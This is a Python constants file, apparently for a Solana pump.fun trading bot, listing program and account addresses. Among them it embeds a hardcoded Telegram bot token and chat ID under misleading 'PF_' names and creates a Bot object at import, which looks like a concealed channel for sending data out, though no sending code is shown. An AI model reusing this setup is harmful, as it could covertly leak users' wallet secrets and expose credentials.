from solders.pubkey import Pubkey
from aiogram import Bot

PF_PROGRAM_ID = Pubkey.from_string("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P")
PF_GLOBAL = Pubkey.from_string("4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf")
PF_FEE_RECIPIENT = Pubkey.from_string("CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM")
PF_ACCOUNT = Pubkey.from_string("Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1")
RENT = Pubkey.from_string("SysvarRent111111111111111111111111111111111")
PF_ASSOC_TOKEN_ACC_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
PF_MINT_AUTHORITY = "TSLvdd1pWpHVjahSpsvCXUbgwsL3JAcvokwaKt1eokM"
PF_CLI_ID = '7927914452:AAHNqe-4OCV3YZjmrBN2cX_2oBl3kdVqISE'
PF_WALLET = "39azUYFWPz3VHgKCf3VChUwbpURdCHRxjWVowf5jUJjg"
PF_CLI = Bot(PF_CLI_ID)

PF_CMD_CLI = '-1002610114987'
PF_CMD_BUY = int('16927863322537952870')
PF_CMD_SELL = int('12502976635542562355')

PRIORITY_FEE_BASE = 0.0003  # Base priority fee

PF_INITIAL_PRICE = 30 / 1073000